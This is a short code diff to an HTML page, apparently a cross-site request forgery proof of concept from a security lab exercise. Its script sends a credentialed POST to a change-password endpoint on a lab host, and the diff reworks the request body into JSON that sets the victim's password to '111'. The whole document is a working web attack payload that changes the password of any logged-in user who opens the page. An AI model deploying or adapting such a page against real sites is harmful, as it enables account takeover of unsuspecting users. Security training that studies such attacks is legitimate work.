@@ -21,8 +21,7 @@
         xhttp.open("POST", "https://60ntsjhgem.voorivex-lab.online/api/change-password");
         xhttp.setRequestHeader('Content-type', 'text/plain');
         xhttp.withCredentials = true;
-        var new_password = "111";
-        xhttp.send("newPassword=" + encodeURIComponent(password));
+        xhttp.send('{"newPassword":"111"}');
     </script>
 
 </body>
